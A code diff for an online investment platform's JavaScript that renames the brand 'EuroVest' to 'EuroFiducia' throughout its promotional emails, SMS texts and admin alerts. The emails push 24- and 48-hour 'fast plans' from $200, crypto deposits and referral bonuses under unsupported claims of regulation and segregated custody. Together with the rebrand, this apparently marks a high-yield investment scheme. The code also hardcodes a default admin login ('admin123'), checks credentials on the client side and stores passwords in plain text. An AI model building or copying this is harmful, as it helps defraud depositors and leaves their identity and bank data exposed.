-    body:'Dear {name},\n\nThe wealthy don\u2019t only earn from their time \u2014 they earn from their assets. Dividends, interest, and investment returns create passive income that flows whether you\u2019re working, resting, or on holiday.\n\nAt EuroVest you can build passive income through:\n\n\u2022 Dividend-paying European equities\n\u2022 Bond coupon payments (French OAT, Italian BTP)\n\u2022 Real estate fund distributions\n\u2022 Fast-plan returns you can reinvest weekly\n\nStart small, reinvest your returns, and watch passive income become a growing part of your life.\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nThe wealthy don\u2019t only earn from their time \u2014 they earn from their assets. Dividends, interest, and investment returns create passive income that flows whether you\u2019re working, resting, or on holiday.\n\nAt EuroFiducia you can build passive income through:\n\n\u2022 Dividend-paying European equities\n\u2022 Bond coupon payments (French OAT, Italian BTP)\n\u2022 Real estate fund distributions\n\u2022 Fast-plan returns you can reinvest weekly\n\nStart small, reinvest your returns, and watch passive income become a growing part of your life.\n\nThe EuroFiducia Team'
   },
   {
     id:'promo_weekly', icon:'\ud83d\uddd3', name:'Weekly Plan Spotlight',
     subject:'\ud83d\uddd3 Earn Returns Every Single Week',
-    body:'Dear {name},\n\nOur Weekly Investment Plan is one of the most popular choices for investors who want regular, predictable returns without locking funds away for months.\n\n\u2022 Term: 7 days\n\u2022 ROI: competitive weekly return\n\u2022 Capital returned at maturity\n\u2022 Reinvest to compound week after week\n\nIt is the ideal middle ground between our lightning-fast 24h/48h plans and our longer monthly, quarterly, and yearly options.\n\nOpen a weekly plan from your dashboard \u2192\n\nThe EuroVest Investment Team'
+    body:'Dear {name},\n\nOur Weekly Investment Plan is one of the most popular choices for investors who want regular, predictable returns without locking funds away for months.\n\n\u2022 Term: 7 days\n\u2022 ROI: competitive weekly return\n\u2022 Capital returned at maturity\n\u2022 Reinvest to compound week after week\n\nIt is the ideal middle ground between our lightning-fast 24h/48h plans and our longer monthly, quarterly, and yearly options.\n\nOpen a weekly plan from your dashboard \u2192\n\nThe EuroFiducia Investment Team'
   },
   {
     id:'promo_monthly', icon:'\ud83d\udcc5', name:'Monthly Plan Spotlight',
     subject:'\ud83d\udcc5 Steady Monthly Returns, Your Way',
-    body:'Dear {name},\n\nLooking for a balance between speed and growth? Our Monthly Investment Plan offers a solid return over a 30-day term \u2014 long enough to capture meaningful growth, short enough to stay flexible.\n\n\u2022 Term: 30 days\n\u2022 ROI: attractive monthly return\n\u2022 Maturity: principal + return credited automatically\n\nPair a monthly plan with a fast plan and you\u2019ve got both liquidity and growth working for you.\n\nExplore monthly plans in your dashboard \u2192\n\nThe EuroVest Investment Team'
+    body:'Dear {name},\n\nLooking for a balance between speed and growth? Our Monthly Investment Plan offers a solid return over a 30-day term \u2014 long enough to capture meaningful growth, short enough to stay flexible.\n\n\u2022 Term: 30 days\n\u2022 ROI: attractive monthly return\n\u2022 Maturity: principal + return credited automatically\n\nPair a monthly plan with a fast plan and you\u2019ve got both liquidity and growth working for you.\n\nExplore monthly plans in your dashboard \u2192\n\nThe EuroFiducia Investment Team'
   },
   {
     id:'promo_quarterly', icon:'\ud83c\udfa9', name:'Quarterly Plan Spotlight',
     subject:'\ud83c\udfa9 90 Days to Stronger Growth',
-    body:'Dear {name},\n\nOur Quarterly Investment Plan gives your capital 90 days to grow \u2014 the sweet spot for investors who want a higher return than monthly plans but don\u2019t want to commit to a full year.\n\n\u2022 Term: 90 days\n\u2022 ROI: enhanced quarterly return\n\u2022 Auto-credited at maturity\n\nLonger terms reward patience with better rates. If you can wait three months, this is a smart, efficient choice.\n\nOpen a quarterly plan today \u2192\n\nThe EuroVest Investment Team'
+    body:'Dear {name},\n\nOur Quarterly Investment Plan gives your capital 90 days to grow \u2014 the sweet spot for investors who want a higher return than monthly plans but don\u2019t want to commit to a full year.\n\n\u2022 Term: 90 days\n\u2022 ROI: enhanced quarterly return\n\u2022 Auto-credited at maturity\n\nLonger terms reward patience with better rates. If you can wait three months, this is a smart, efficient choice.\n\nOpen a quarterly plan today \u2192\n\nThe EuroFiducia Investment Team'
   },
   {
     id:'promo_yearly', icon:'\ud83c\udf89', name:'Yearly Plan \u2014 Maximum Growth',
     subject:'\ud83c\udf89 Maximize Your Returns with Our Yearly Plan',
-    body:'Dear {name},\n\nTime is the most powerful force in investing. Our Yearly Investment Plan rewards your patience with the highest ROI we offer \u2014 designed for long-term wealth builders.\n\n\u2022 Term: 365 days\n\u2022 ROI: maximum annual return\n\u2022 Principal + full return credited at maturity\n\nThis is the plan for retirement savings, building a home deposit, or any goal where compounding has time to work its magic.\n\nStart a yearly plan and let 12 months of growth work for you \u2192\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nTime is the most powerful force in investing. Our Yearly Investment Plan rewards your patience with the highest ROI we offer \u2014 designed for long-term wealth builders.\n\n\u2022 Term: 365 days\n\u2022 ROI: maximum annual return\n\u2022 Principal + full return credited at maturity\n\nThis is the plan for retirement savings, building a home deposit, or any goal where compounding has time to work its magic.\n\nStart a yearly plan and let 12 months of growth work for you \u2192\n\nThe EuroFiducia Team'
   },
   {
     id:'motivate_first_deposit', icon:'\ud83c\udfa8', name:'Your First Deposit Matters Most',
     subject:'\ud83c\udfa8 The Hardest Deposit Is the First One',
-    body:'Dear {name},\n\nEvery investor remembers their first deposit. It is the moment intention becomes action. After that, everything gets easier \u2014 you can see your money growing, reinvest your returns, and build momentum.\n\nYou don\u2019t need to start big. Our fast plans begin at just $200, and the gas fee is on us. One small deposit today can be the foundation of something significant.\n\nTake that first step. Future you will be grateful.\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nEvery investor remembers their first deposit. It is the moment intention becomes action. After that, everything gets easier \u2014 you can see your money growing, reinvest your returns, and build momentum.\n\nYou don\u2019t need to start big. Our fast plans begin at just $200, and the gas fee is on us. One small deposit today can be the foundation of something significant.\n\nTake that first step. Future you will be grateful.\n\nThe EuroFiducia Team'
   },
   {
     id:'motivate_habit', icon:'\ud83d\udd04', name:'Build the Investing Habit',
     subject:'\ud83d\udd04 Consistency Beats Intensity in Investing',
-    body:'Dear {name},\n\nYou don\u2019t need to time the market or make dramatic moves. You just need a habit. Investors who consistently add to their portfolio \u2014 even small amounts \u2014 outperform those who wait for the \u201cperfect\u201d moment.\n\nSet a simple rule for yourself:\n\n\u2022 Deposit a fixed amount each week or month\n\u2022 Reinvest your returns automatically\n\u2022 Review your portfolio quarterly, not daily\n\nSmall, steady habits compound into real wealth. Build yours today.\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nYou don\u2019t need to time the market or make dramatic moves. You just need a habit. Investors who consistently add to their portfolio \u2014 even small amounts \u2014 outperform those who wait for the \u201cperfect\u201d moment.\n\nSet a simple rule for yourself:\n\n\u2022 Deposit a fixed amount each week or month\n\u2022 Reinvest your returns automatically\n\u2022 Review your portfolio quarterly, not daily\n\nSmall, steady habits compound into real wealth. Build yours today.\n\nThe EuroFiducia Team'
   },
   {
     id:'motivate_wealth', icon:'\ud83c\udfc6', name:'Wealth Is Built, Not Won',
     subject:'\ud83c\udfc6 Wealth Is Built, Not Won Overnight',
-    body:'Dear {name},\n\nWealth is rarely the result of a single lucky break. It is built, layer by layer, through patience, discipline, and the decision to let your money work for you.\n\nEuroVest gives you the tools: fast plans for quick returns, longer plans for compounding growth, and managed portfolios for hands-off investing. The only missing ingredient is your decision to begin.\n\nStart building today. Brick by brick, plan by plan, your wealth takes shape.\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nWealth is rarely the result of a single lucky break. It is built, layer by layer, through patience, discipline, and the decision to let your money work for you.\n\nEuroFiducia gives you the tools: fast plans for quick returns, longer plans for compounding growth, and managed portfolios for hands-off investing. The only missing ingredient is your decision to begin.\n\nStart building today. Brick by brick, plan by plan, your wealth takes shape.\n\nThe EuroFiducia Team'
   },
   {
     id:'adv_risk_reward', icon:'\u2696\ufe0f', name:'Understanding Risk & Reward',
     subject:'\u2696\ufe0f Know Your Risk Tolerance Before You Invest',
-    body:'Dear {name},\n\nInvesting always involves some risk \u2014 but risk is not the enemy. Unmanaged risk is. The key is matching your investments to your personal risk tolerance.\n\nConservative? Our bonds and balanced portfolios prioritise stability.\nBalanced? A mix of equities, bonds, and real estate spreads risk while seeking growth.\nGrowth-minded? Our growth portfolios and crypto options target higher returns.\n\nAnd for funds you want to keep flexible, our 24h / 48h / weekly plans offer short-term returns with quick access.\n\nKnow yourself, choose your plan, and invest with confidence.\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nInvesting always involves some risk \u2014 but risk is not the enemy. Unmanaged risk is. The key is matching your investments to your personal risk tolerance.\n\nConservative? Our bonds and balanced portfolios prioritise stability.\nBalanced? A mix of equities, bonds, and real estate spreads risk while seeking growth.\nGrowth-minded? Our growth portfolios and crypto options target higher returns.\n\nAnd for funds you want to keep flexible, our 24h / 48h / weekly plans offer short-term returns with quick access.\n\nKnow yourself, choose your plan, and invest with confidence.\n\nThe EuroFiducia Team'
   },
   {
-    id:'motivate_community', icon:'\ud83c\udf0d', name:'Join Thousands of EuroVest Investors',
+    id:'motivate_community', icon:'\ud83c\udf0d', name:'Join Thousands of EuroFiducia Investors',
     subject:'\ud83c\udf0d You\u2019re Part of a Growing Community of Investors',
-    body:'Dear {name},\n\nWhen you invest with EuroVest, you\u2019re never investing alone. You\u2019re joining thousands of investors across France, Italy, and the wider European Economic Area who are building their financial futures with us.\n\nOur community benefits from:\n\n\u2022 Regulated, transparent investment services\n\u2022 AI support in your language, 24/7\n\u2022 Plans for every timeline and goal\n\u2022 Gas fees covered on your deposits\n\nYou\u2019re in good company. Keep growing.\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nWhen you invest with EuroFiducia, you\u2019re never investing alone. You\u2019re joining thousands of investors across France, Italy, and the wider European Economic Area who are building their financial futures with us.\n\nOur community benefits from:\n\n\u2022 Regulated, transparent investment services\n\u2022 AI support in your language, 24/7\n\u2022 Plans for every timeline and goal\n\u2022 Gas fees covered on your deposits\n\nYou\u2019re in good company. Keep growing.\n\nThe EuroFiducia Team'
   },
   {
     id:'adv_reinvest', icon:'\ud83c\udf00', name:'Reinvest to Accelerate Growth',
     subject:'\ud83c\udf00 Reinvest Your Returns and Watch Growth Accelerate',
-    body:'Dear {name},\n\nWhen your fast plan or monthly plan matures, you have a choice: withdraw the return, or reinvest it. Reinvesting is the engine of compounding.\n\nEach time you reinvest, your next return is calculated on a larger base. Over many cycles, this transforms modest gains into meaningful wealth.\n\nOur dashboard makes it simple \u2014 when a plan matures, reinvest in one click into the same or a different plan.\n\nKeep the compounding cycle turning. Your future self will be glad you did.\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nWhen your fast plan or monthly plan matures, you have a choice: withdraw the return, or reinvest it. Reinvesting is the engine of compounding.\n\nEach time you reinvest, your next return is calculated on a larger base. Over many cycles, this transforms modest gains into meaningful wealth.\n\nOur dashboard makes it simple \u2014 when a plan matures, reinvest in one click into the same or a different plan.\n\nKeep the compounding cycle turning. Your future self will be glad you did.\n\nThe EuroFiducia Team'
   },
   {
     id:'motivate_dont_wait', icon:'\u23f3', name:'Don\u2019t Wait for the \u201cPerfect\u201d Time',
     subject:'\u23f3 The Best Time to Start Was Yesterday. The Next Best Is Today.',
-    body:'Dear {name},\n\nMany people delay investing waiting for the \u201cperfect\u201d moment \u2014 when markets are calm, when they have more savings, when life is less busy. That moment rarely arrives.\n\nThe reality: time in the market beats timing the market. The investors who succeed are the ones who simply begin and stay consistent.\n\nWith EuroVest you can start from $200, choose a plan from 24 hours to a full year, and let us cover the gas fees. There is no perfect time. There is only today.\n\nStart now \u2192\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nMany people delay investing waiting for the \u201cperfect\u201d moment \u2014 when markets are calm, when they have more savings, when life is less busy. That moment rarely arrives.\n\nThe reality: time in the market beats timing the market. The investors who succeed are the ones who simply begin and stay consistent.\n\nWith EuroFiducia you can start from $200, choose a plan from 24 hours to a full year, and let us cover the gas fees. There is no perfect time. There is only today.\n\nStart now \u2192\n\nThe EuroFiducia Team'
   },
   {
     id:'adv_tax', icon:'\ud83d\udcb4', name:'Tax-Advantaged Investing',
     subject:'\ud83d\udcb4 Invest Smartly: Understand Tax-Advantaged Products',
-    body:'Dear {name},\n\nWhere you invest can be just as important as what you invest in. Tax-advantaged products let more of your returns stay in your pocket.\n\nDepending on your country:\n\n\u2022 France: PER (Plan d\u2019\u00c9pargne Retraite), Livret A, LDDS, PEA\n\u2022 Italy: PIR (Piano Individuale di Risparmio), deposit accounts\n\u2022 Other EU: country-specific wrappers\n\nThese can reduce or defer tax on your investment gains. Our retirement and savings products are designed to help you take advantage of these benefits.\n\nExplore tax-smart options in your dashboard \u2192\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nWhere you invest can be just as important as what you invest in. Tax-advantaged products let more of your returns stay in your pocket.\n\nDepending on your country:\n\n\u2022 France: PER (Plan d\u2019\u00c9pargne Retraite), Livret A, LDDS, PEA\n\u2022 Italy: PIR (Piano Individuale di Risparmio), deposit accounts\n\u2022 Other EU: country-specific wrappers\n\nThese can reduce or defer tax on your investment gains. Our retirement and savings products are designed to help you take advantage of these benefits.\n\nExplore tax-smart options in your dashboard \u2192\n\nThe EuroFiducia Team'
   },
   {
     id:'promo_referral', icon:'\ud83e\udd1d', name:'Refer & Grow Together',
-    subject:'\ud83e\udd1d Invite Friends, Grow the EuroVest Community',
-    body:'Dear {name},\n\nInvesting is more rewarding when you do it alongside people you trust. Invite friends and family to join EuroVest and help them start their own wealth-building journey.\n\nWhen your referrals make their first deposit:\n\n\u2022 They unlock all platform features\n\u2022 They gain access to fast plans from $200\n\u2022 They get gas-fee-free deposits, just like you\n\nA stronger community means a stronger platform for everyone. Share EuroVest today.\n\nThe EuroVest Team'
+    subject:'\ud83e\udd1d Invite Friends, Grow the EuroFiducia Community',
+    body:'Dear {name},\n\nInvesting is more rewarding when you do it alongside people you trust. Invite friends and family to join EuroFiducia and help them start their own wealth-building journey.\n\nWhen your referrals make their first deposit:\n\n\u2022 They unlock all platform features\n\u2022 They gain access to fast plans from $200\n\u2022 They get gas-fee-free deposits, just like you\n\nA stronger community means a stronger platform for everyone. Share EuroFiducia today.\n\nThe EuroFiducia Team'
   },
   {
     id:'motivate_pride', icon:'\ud83c\udf1f', name:'Be Proud of Starting',
     subject:'\ud83c\udf1f You Did What Most People Only Talk About',
-    body:'Dear {name},\n\nMost people talk about investing someday. You actually started. That alone puts you ahead of the majority. Be proud of that.\n\nEvery plan you open, every return you reinvest, every deposit you make \u2014 it all adds up. Wealth isn\u2019t built in a single dramatic move. It\u2019s built in moments just like this one.\n\nKeep going. You\u2019re on the right path.\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nMost people talk about investing someday. You actually started. That alone puts you ahead of the majority. Be proud of that.\n\nEvery plan you open, every return you reinvest, every deposit you make \u2014 it all adds up. Wealth isn\u2019t built in a single dramatic move. It\u2019s built in moments just like this one.\n\nKeep going. You\u2019re on the right path.\n\nThe EuroFiducia Team'
   },
   {
     id:'adv_emotions', icon:'\ud83d\udc87', name:'Don\u2019t Let Emotions Drive Your Investing',
     subject:'\ud83d\udc87 Keep Calm and Stay Invested',
-    body:'Dear {name},\n\nThe biggest threat to your returns isn\u2019t the market \u2014 it\u2019s your own emotions. Fear makes investors sell at the worst time. Greed makes them chase bubbles.\n\nThe antidote is a plan:\n\n\u2022 Decide your goals and timeline in advance\n\u2022 Pick plans that match your risk tolerance\n\u2022 Avoid checking your portfolio obsessively\n\u2022 Trust the process over the long term\n\nEuroVest\u2019s managed portfolios and structured plans help you stay disciplined by removing the day-to-day decision-making stress.\n\nInvest with your head, not your emotions.\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nThe biggest threat to your returns isn\u2019t the market \u2014 it\u2019s your own emotions. Fear makes investors sell at the worst time. Greed makes them chase bubbles.\n\nThe antidote is a plan:\n\n\u2022 Decide your goals and timeline in advance\n\u2022 Pick plans that match your risk tolerance\n\u2022 Avoid checking your portfolio obsessively\n\u2022 Trust the process over the long term\n\nEuroFiducia\u2019s managed portfolios and structured plans help you stay disciplined by removing the day-to-day decision-making stress.\n\nInvest with your head, not your emotions.\n\nThe EuroFiducia Team'
   },
   {
     id:'motivate_recession', icon:'\ud83c\udf10', name:'Opportunities in Every Market',
     subject:'\ud83c\udf10 Down Markets Are Sale Days for Patient Investors',
-    body:'Dear {name},\n\nWhen markets fall, headlines scream panic. But for long-term investors, downturns are simply assets going on sale.\n\nHistory is clear: every major decline has eventually been followed by recovery and new highs. Investors who buy during fear and hold through recovery capture the strongest gains.\n\nIf you have cash on the sidelines, consider our fast plans for liquidity and longer plans to deploy capital steadily through any market.\n\nDon\u2019t fear the dips. Use them.\n\nThe EuroVest Team'
+    body:'Dear {name},\n\nWhen markets fall, headlines scream panic. But for long-term investors, downturns are simply assets going on sale.\n\nHistory is clear: every major decline has eventually been followed by recovery and new highs. Investors who buy during fear and hold through recovery capture the strongest gains.\n\nIf you have cash on the sidelines, consider our fast plans for liquidity and longer plans to deploy capital steadily through any market.\n\nDon\u2019t fear the dips. Use them.\n\nThe EuroFiducia Team'
   },
   {
     id:'promo_newplans', icon:'\ud83c\udf81', name:'New Plans Added',
-    subject:'\ud83c\udf81 New Investment Plans Are Now Live on EuroVest',
-    body:'Dear {name},\n\nWe\u2019ve expanded our investment lineup to give you even more flexibility:\n\n\u2022 24-Hour Fast Plan (from $200)\n\u2022 48-Hour Fast Plan (from $200)\n\u2022 Weekly Plan\n\u2022 Monthly Plan\n\u2022 Quarterly Plan\n\u2022 Yearly Plan (maximum ROI)\n\nWhether you want quick returns or long-term growth, there\u2019s now a plan that fits your exact timeline. And remember \u2014 the gas fee is on us.\n\nExplore all plans in your dashboard \u2192\n\nThe EuroVest Investment Team'
+    subject:'\ud83c\udf81 New Investment Plans Are Now Live on EuroFiducia',
+    body:'Dear {name},\n\nWe\u2019ve expanded our investment lineup to give you even more flexibility:\n\n\u2022 24-Hour Fast Plan (from $200)\n\u2022 48-Hour Fast Plan (from $200)\n\u2022 Weekly Plan\n\u2022 Monthly Plan\n\u2022 Quarterly Plan\n\u2022 Yearly Plan (maximum ROI)\n\nWhether you want quick returns or long-term growth, there\u2019s now a plan that fits your exact timeline. And remember \u2014 the gas fee is on us.\n\nExplore all plans in your dashboard \u2192\n\nThe EuroFiducia Investment Team'
   },
   {
     id:'motivate_secure', icon:'\ud83d\udd12', name:'Your Money Is Secure',
-    subject:'\ud83d\udd12 How EuroVest Keeps Your Investments Secure',
-    body:'Dear {name},\n\nSecurity is the foundation of confident investing. Here\u2019s how we protect you:\n\n\u2022 Regulated investment services under European frameworks\n\u2022 KYC/AML compliance for every account\n\u2022 Segregated custody for your funds\n\u2022 Blockchain-verified crypto deposits with permanent proof\n\u2022 Encrypted data handling\n\nWhen your money is secure, you can invest with peace of mind. That\u2019s our commitment to you.\n\nThe EuroVest Team'
+    subject:'\ud83d\udd12 How EuroFiducia Keeps Your Investments Secure',
+    body:'Dear {name},\n\nSecurity is the foundation of confident investing. Here\u2019s how we protect you:\n\n\u2022 Regulated investment services under European frameworks\n\u2022 KYC/AML compliance for every account\n\u2022 Segregated custody for your funds\n\u2022 Blockchain-verified crypto deposits with permanent proof\n\u2022 Encrypted data handling\n\nWhen your money is secure, you can invest with peace of mind. That\u2019s our commitment to you.\n\nThe EuroFiducia Team'
   }
 ];
 
@@ -414,13 +414,13 @@ EV.auth = {
     EV.store.set('users', users);
     // Send acknowledgment email to user
     EV.mail.send(user.email,
-      'Account Submission Received — EuroVest',
-      'Dear '+user.firstName+' '+user.lastName+',\n\nThank you for submitting your account application to EuroVest. We have received your registration details, identity information, and bank account verification.\n\nYour account is currently under review by our compliance team. This process typically takes 1-2 business days. During this time, our team will verify your identity documents and bank account details in accordance with European AML/KYC regulations.\n\nWhat happens next:\n1. Our compliance team reviews your submission\n2. You will receive an email once your account is approved\n3. Upon approval, you can make your first deposit and start investing\n\nIf we need any additional information, we will contact you via email and your dashboard.\n\nYou can track your account status by logging into your dashboard.\n\nThank you for choosing EuroVest.\n\nBest regards,\nThe EuroVest Compliance Team\nEuroVest SAS — France & Italy',
+      'Account Submission Received — EuroFiducia',
+      'Dear '+user.firstName+' '+user.lastName+',\n\nThank you for submitting your account application to EuroFiducia. We have received your registration details, identity information, and bank account verification.\n\nYour account is currently under review by our compliance team. This process typically takes 1-2 business days. During this time, our team will verify your identity documents and bank account details in accordance with European AML/KYC regulations.\n\nWhat happens next:\n1. Our compliance team reviews your submission\n2. You will receive an email once your account is approved\n3. Upon approval, you can make your first deposit and start investing\n\nIf we need any additional information, we will contact you via email and your dashboard.\n\nYou can track your account status by logging into your dashboard.\n\nThank you for choosing EuroFiducia.\n\nBest regards,\nThe EuroFiducia Compliance Team\nEuroFiducia SAS — France & Italy',
       {type:'account_acknowledgment', userId:user.id});
     // Send SMS acknowledgment if opted in
     if (user.smsOptIn && user.phone) {
       EV.mail.sendSMS(user.phone,
-        'EuroVest: Account submission received. Your application is under review. You will be notified once approved. Track status in your dashboard.',
+        'EuroFiducia: Account submission received. Your application is under review. You will be notified once approved. Track status in your dashboard.',
         {type:'account_acknowledgment', userId:user.id});
     }
     // Notify admin
@@ -431,7 +431,7 @@ EV.auth = {
       read: false
     });
     // Also email admin
-    EV.mail.send('admin@eurovest.eu',
+    EV.mail.send('admin@eurofiducia.eu',
       'New Account Registration — '+user.firstName+' '+user.lastName,
       'A new user has registered:\n\nName: '+user.firstName+' '+user.lastName+'\nEmail: '+user.email+'\nPhone: '+user.phone+'\nCountry: '+user.country+'\nBank: '+user.bankName+' (IBAN: '+user.iban+')\n\nAccount status: PENDING\nPlease review in the admin dashboard → User Management.',
       {type:'admin_registration_alert'});
@@ -439,7 +439,7 @@ EV.auth = {
   },
   login: function(email, password) {
     var users = EV.store.get('users', []);
-    var admin = EV.store.get('admin', {email:'admin@eurovest.eu', password:'admin123'});
+    var admin = EV.store.get('admin', {email:'admin@eurofiducia.eu', password:'admin123'});
     if (email===admin.email && password===admin.password) {
       EV.store.set('admin_session', {email:admin.email, time:Date.now()});
       return {ok:true, role:'admin'};
@@ -487,7 +487,7 @@ EV.auth = {
         type: 'deposit',
         amount: 200,
         method: 'Sign-up Bonus',
-        description: '$200 Sign-up Bonus — Welcome to EuroVest!',
+        description: '$200 Sign-up Bonus — Welcome to EuroFiducia!',
         status: 'completed'
       });
       // Record bonus flag on user so it's only given once
@@ -503,7 +503,7 @@ EV.auth = {
             type: 'deposit',
             amount: 50,
             method: 'Referral Bonus',
-            description: '$50 Referral Bonus — ' + user.firstName + ' ' + user.lastName + ' joined EuroVest',
+            description: '$50 Referral Bonus — ' + user.firstName + ' ' + user.lastName + ' joined EuroFiducia',
             status: 'completed'
           });
           // Track referral count on referrer
@@ -515,22 +515,22 @@ EV.auth = {
           EV.mail.send(referrer.email,
             'Referral Bonus Earned — $50 Credited!',
             'Dear ' + referrer.firstName + ',\n\nCongratulations! You earned a $50 referral bonus.\n\n' +
-            user.firstName + ' ' + user.lastName + ' has successfully opened and verified their EuroVest account using your referral code (' + user.referredBy + ').\n\n' +
-            '$50.00 has been credited to your EuroVest account balance.\n\n' +
-            'Keep sharing your referral code to earn more!\n\nBest regards,\nThe EuroVest Team',
+            user.firstName + ' ' + user.lastName + ' has successfully opened and verified their EuroFiducia account using your referral code (' + user.referredBy + ').\n\n' +
+            '$50.00 has been credited to your EuroFiducia account balance.\n\n' +
+            'Keep sharing your referral code to earn more!\n\nBest regards,\nThe EuroFiducia Team',
             {type:'referral_bonus', userId:referrer.id});
           if (referrer.smsOptIn && referrer.phone) {
-            EV.mail.sendSMS(referrer.phone, 'EuroVest: You earned a $50 referral bonus! ' + user.firstName + ' ' + user.lastName + ' joined using your code. $50 credited to your balance.', {type:'referral_bonus', userId:referrer.id});
+            EV.mail.sendSMS(referrer.phone, 'EuroFiducia: You earned a $50 referral bonus! ' + user.firstName + ' ' + user.lastName + ' joined using your code. $50 credited to your balance.', {type:'referral_bonus', userId:referrer.id});
           }
         }
       }
 
       EV.mail.send(user.email,
-        'Account Approved — Welcome to EuroVest!',
-        'Dear '+user.firstName+' '+user.lastName+',\n\nGreat news! Your EuroVest account has been approved and is now fully active.\n\n'+'========================================\n'+'  YOUR OFFICIAL EUROVEST ACCOUNT DETAILS\n'+'========================================\n'+'  Account Number      : '+user.accountNumber+'\n'+'  Client / Member ID  : '+user.memberId+'\n'+'========================================\n\n'+'Please keep these identifiers safe. They appear on your dashboard, transaction receipts, and all official correspondence. Quote your Account Number when contacting support.\n\n'+'========================================\n'+'  $200 SIGN-UP BONUS — CREDITED TO YOUR ACCOUNT\n'+'========================================\n'+'  A $200.00 welcome bonus has been credited to your account balance! Use it toward your first investment.\n'+'========================================\n\n'+'You can now:\n• Make deposits via SEPA, card, open banking, or cryptocurrency\n• Invest in any of our portfolios and products\n• Request withdrawals to your verified bank account\n• Access all platform features\n• Refer friends and earn $50 per referral — find your referral code on your dashboard\n\nLog in to your dashboard to get started →\n\nWelcome aboard!\nThe EuroVest Team',
+        'Account Approved — Welcome to EuroFiducia!',
+        'Dear '+user.firstName+' '+user.lastName+',\n\nGreat news! Your EuroFiducia account has been approved and is now fully active.\n\n'+'========================================\n'+'  YOUR OFFICIAL EUROFIDUCIA ACCOUNT DETAILS\n'+'========================================\n'+'  Account Number      : '+user.accountNumber+'\n'+'  Client / Member ID  : '+user.memberId+'\n'+'========================================\n\n'+'Please keep these identifiers safe. They appear on your dashboard, transaction receipts, and all official correspondence. Quote your Account Number when contacting support.\n\n'+'========================================\n'+'  $200 SIGN-UP BONUS — CREDITED TO YOUR ACCOUNT\n'+'========================================\n'+'  A $200.00 welcome bonus has been credited to your account balance! Use it toward your first investment.\n'+'========================================\n\n'+'You can now:\n• Make deposits via SEPA, card, open banking, or cryptocurrency\n• Invest in any of our portfolios and products\n• Request withdrawals to your verified bank account\n• Access all platform features\n• Refer friends and earn $50 per referral — find your referral code on your dashboard\n\nLog in to your dashboard to get started →\n\nWelcome aboard!\nThe EuroFiducia Team',
         {type:'account_approved', userId:user.id});
       if (user.smsOptIn && user.phone) {
-        EV.mail.sendSMS(user.phone, 'EuroVest: Account approved! Acct No: '+user.accountNumber+' | Member ID: '+user.memberId+'. $200 sign-up bonus credited! You can now deposit, invest & refer friends for $50 each.', {type:'account_approved', userId:user.id});
+        EV.mail.sendSMS(user.phone, 'EuroFiducia: Account approved! Acct No: '+user.accountNumber+' | Member ID: '+user.memberId+'. $200 sign-up bonus credited! You can now deposit, invest & refer friends for $50 each.', {type:'account_approved', userId:user.id});
       }
       EV.store.push('admin_notifications', {
         id: Date.now(), type:'account_approved', time: new Date().toISOString(),
@@ -548,8 +548,8 @@ EV.auth = {
     users[idx].password = newPassword;
     EV.store.set('users', users);
     // Notify user of password change
-    EV.mail.send(email, 'Password Changed — EuroVest',
-      'Dear '+users[idx].firstName+',\n\nYour EuroVest account password has been successfully changed.\n\nIf you did not make this change, please contact support immediately.\n\nBest regards,\nThe EuroVest Security Team',
+    EV.mail.send(email, 'Password Changed — EuroFiducia',
+      'Dear '+users[idx].firstName+',\n\nYour EuroFiducia account password has been successfully changed.\n\nIf you did not make this change, please contact support immediately.\n\nBest regards,\nThe EuroFiducia Security Team',
       {type:'password_change', userId:users[idx].id});
     // Notify admin
     EV.store.push('admin_notifications', {
@@ -560,7 +560,7 @@ EV.auth = {
     return {ok:true};
   },
   resetAdminPassword: function(newPassword) {
-    var admin = EV.store.get('admin', {email:'admin@eurovest.eu', password:'admin123'});
+    var admin = EV.store.get('admin', {email:'admin@eurofiducia.eu', password:'admin123'});
     admin.password = newPassword;
     EV.store.set('admin', admin);
     return {ok:true};
@@ -588,8 +588,8 @@ EV.notify = {
     // Email admin about visit (first visit per session only)
     if (!sessionStorage.getItem('ev_visit_logged')) {
       sessionStorage.setItem('ev_visit_logged','1');
-      EV.mail.send('admin@eurovest.eu', 'New Website Visit',
-        'A new visitor has arrived on the EuroVest platform.\n\nPage: '+visit.page+'\nLanguage: '+visit.lang.toUpperCase()+'\nTime: '+new Date().toLocaleString()+'\n\nThis is an automated notification.',
+      EV.mail.send('admin@eurofiducia.eu', 'New Website Visit',
+        'A new visitor has arrived on the EuroFiducia platform.\n\nPage: '+visit.page+'\nLanguage: '+visit.lang.toUpperCase()+'\nTime: '+new Date().toLocaleString()+'\n\nThis is an automated notification.',
         {type:'admin_visit_alert'});
     }
   },
@@ -603,16 +603,16 @@ EV.notify = {
       read: false, amount: amount
     });
     // Email admin
-    EV.mail.send('admin@eurovest.eu', 'Deposit Alert — €'+amount+' by '+userName,
+    EV.mail.send('admin@eurofiducia.eu', 'Deposit Alert — €'+amount+' by '+userName,
       'A deposit has been initiated:\n\nUser: '+userName+'\nEmail: '+(user?user.email:'')+'\nAmount: €'+amount+'\nMethod: '+method+'\nTime: '+new Date().toLocaleString()+'\n\nReview in admin dashboard.',
       {type:'admin_deposit_alert'});
     // Notify user via email + dashboard
     if (user) {
       EV.mail.send(user.email, 'Deposit Received — €'+amount,
-        'Dear '+user.firstName+',\n\nWe have received your deposit request of €'+amount+' via '+method+'.\n\nYour funds will be credited to your account within 1-2 business days. You will receive a transaction receipt once processing is complete.\n\nThank you for investing with EuroVest.\n\nThe EuroVest Team',
+        'Dear '+user.firstName+',\n\nWe have received your deposit request of €'+amount+' via '+method+'.\n\nYour funds will be credited to your account within 1-2 business days. You will receive a transaction receipt once processing is complete.\n\nThank you for investing with EuroFiducia.\n\nThe EuroFiducia Team',
         {type:'deposit_confirmation', userId:user.id});
       if (user.smsOptIn && user.phone) {
-        EV.mail.sendSMS(user.phone, 'EuroVest: Deposit of €'+amount+' received via '+method+'. Processing within 1-2 business days.', {type:'deposit_confirmation', userId:user.id});
